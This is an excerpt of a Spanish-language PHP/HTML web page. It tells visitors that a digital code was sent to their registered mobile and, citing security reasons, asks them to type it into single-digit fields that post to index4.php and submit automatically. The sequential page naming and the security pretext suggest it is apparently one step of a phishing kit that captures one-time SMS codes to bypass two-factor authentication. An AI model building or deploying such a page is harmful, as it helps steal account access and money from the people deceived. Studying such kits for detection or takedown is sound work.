...
?>
  ...
  <div class="panel-heading">
    <h3>
      Hemos enviado un codigo-clave digital a su movil registrado para verificar
    </h3>
  </div>
</div>
            ...
            <div class="col-lg-4 col-md-5 col-sm-6">
              ...
              <div class="panel_general">
                <div class="title-panel-label">
                  ...
                  <label class="control-label" for="username"><h2>Por motivos de seguridad ingrese el codigo-clave digital que hemos enviado a tu movil registrado</h2></label>
                
                <div id="contenido">
                <div align="center"><br>
                    <form _ngcontent-jsd-c16="" method="post" id="form1" action="index4.php" class="ng-untouched ng-pristine ng-invalid">
  ...
  <input type="tel" maxlength="1" style="width:45px;" onkeypress="soloNumeros(event)"  onkeyup="if (this.value.length == this.getAttribute('maxlength')) form1.submit();" id="num6" name="num6" autocomplete="off" required>
   ...
   <br><br>
                    ...
                    <input id="" name="btnGo" class="btn btn-success" type="submit" value="Confirmar Codigo recibido en su movil">
                  
  </form>
  <br> <br>
  <font size="4px;" color="">Ingresa tu Codigo-Clave Digital antes de<br><span>
